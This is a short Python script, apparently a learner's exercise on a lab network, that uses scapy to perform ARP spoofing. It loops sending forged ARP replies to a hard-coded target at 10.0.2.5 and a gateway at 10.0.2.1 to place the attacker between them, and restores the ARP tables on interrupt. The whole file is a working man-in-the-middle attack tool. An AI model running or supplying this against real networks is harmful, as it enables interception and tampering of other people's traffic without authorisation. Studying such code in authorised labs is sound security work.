import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_req=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    ##create a packge arp request
    arp_request_broadcast=broadcast/arp_req

    answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip,spoof_ip):
    #in all packt sents the scapy model aoutmtaclliy add the linux mac address to the packt
    target_mac=get_mac(target_ip)
    packt=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packt,verbose=False)

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)


sent_packt_number=0
target_ip="10.0.2.5"
geteway_ip="10.0.2.1"

try:
    while True:
        #replace target
        spoof(target_ip,geteway_ip)
        #replace router
        spoof(geteway_ip,target_ip)
        time.sleep(2)
        sent_packt_number=sent_packt_number+2
        print("\r[+]-Packets sent:"+str(sent_packt_number),end="")
except KeyboardInterrupt:
    restore(target_ip,geteway_ip)#rest target arp
    restore(geteway_ip,target_ip)#rest getewy arp
    print("Detected Ctrl c ...Rest ARP table")
